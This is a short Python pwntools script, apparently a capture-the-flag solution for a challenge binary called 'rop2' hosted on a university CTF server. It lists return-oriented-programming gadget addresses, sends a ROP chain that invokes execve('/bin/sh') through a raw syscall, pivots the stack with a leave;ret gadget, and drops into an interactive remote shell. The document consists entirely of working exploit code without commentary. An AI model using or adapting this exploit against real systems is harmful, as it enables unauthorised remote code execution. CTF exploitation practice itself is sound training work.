from pwn import *


pop_rdi = p64(0x401516)
pop_rbx = p64(0x400d55)
push_rbx = p64(0x40d789)
push_rsp = p64(0x41be4a)
xor_eax = p64(0x401590)
syscall = p64(0x4003da)
pop_rdx = p64(0x4428e6)
pop_rsi = p64(0x401637)
pop_rax_rdx_rbx = p64(0x478616)
leave_ret = p64(0x4009e4)
pop_rbp = p64(0x4004d1)

buf = 0x7fffffffe240
ret = 0x7fffffffe268

r = remote('bamboofox.cs.nctu.edu.tw', 12018)
#r = process('./rop2')

#raw_input()
r.sendline('/bin/sh\0' + pop_rdi + p64(0x6ccd60) + pop_rsi + p64(0) + pop_rax_rdx_rbx + p64(59) + p64(0) + p64(0) + syscall)
r.recvuntil('input_size')
r.send(pop_rbp + p64(0x6ccd60) + leave_ret + 'a' * 8 + '\x28')


r.interactive()
